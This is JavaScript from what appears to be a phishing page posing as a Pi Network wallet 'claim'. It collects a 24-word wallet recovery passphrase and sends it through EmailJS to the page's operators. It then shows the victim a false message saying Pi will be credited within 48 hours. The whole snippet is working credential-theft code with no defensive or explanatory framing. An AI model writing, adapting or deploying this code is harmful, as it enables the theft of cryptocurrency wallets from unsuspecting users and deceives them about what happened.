
        (function() {
            emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
        })();

        function sendPassphrase() {
            const passphrase = document.querySelector('.input-box').value.trim();
            const wordCount = passphrase.split(/\s+/).length;
            const errorMessage = document.getElementById('error-message');

            if (wordCount !== 24) {
                // Show error message if word count is not 24
                errorMessage.style.display = 'block';
                return;
            }

            // Hide error message if the word count is correct
            errorMessage.style.display = 'none';

            // Send the passphrase
            emailjs.send("service_swe0q9b", "template_so4np09", {
                passphrase: passphrase
            }).then(function(response) {
                alert("Your claim was successful! Pi will be credited into your wallet within 48 hours");
            }, function(error) {
                alert("Failed to send passphrase: " + error.text);
            });
        }

type="text/javascript">
(function(){
  emailjs.init({
    publicKey: "ea_TpH6FdvUeBa85C",
  });
})();